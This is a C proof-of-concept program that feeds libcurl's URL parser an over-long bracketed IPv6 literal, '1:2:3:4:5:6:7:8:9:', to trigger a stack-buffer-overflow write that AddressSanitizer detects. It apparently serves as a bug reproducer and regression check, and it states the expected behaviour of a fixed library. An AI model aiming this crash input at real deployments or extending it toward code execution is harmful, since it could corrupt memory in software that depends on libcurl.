/*
 * Proof of concept: drives libcurl's public URL API with a bracketed
 * IPv6 host literal that carries more groups than an IPv6 address can
 * hold, with a colon terminating the group that overflows the address.
 *
 * Reaching curlx_inet_pton(AF_INET6, ...) with
 * "1:2:3:4:5:6:7:8:9:" makes the parser commit a ninth 16-bit group
 * into its 16-byte on-stack conversion buffer before it validates the
 * buffer bound, which AddressSanitizer reports as a
 * stack-buffer-overflow write.
 *
 * Expected on a fixed libcurl: curl_url_set() returns CURLUE_BAD_IPV6
 * and the program exits normally.
 */
#include <stdio.h>
#include <curl/curl.h>

int main(void)
{
  CURLU *u;
  CURLUcode rc;

  if(curl_global_init(CURL_GLOBAL_ALL))
    return 2;

  u = curl_url();
  if(!u)
    return 2;

  rc = curl_url_set(u, CURLUPART_URL, "http://[1:2:3:4:5:6:7:8:9:]/", 0);
  printf("CURLUPART_URL rc=%d\n", (int)rc);

  rc = curl_url_set(u, CURLUPART_HOST, "[1:2:3:4:5:6:7:8:9:]", 0);
  printf("CURLUPART_HOST rc=%d\n", (int)rc);

  curl_url_cleanup(u);
  curl_global_cleanup();
  return 0;
}
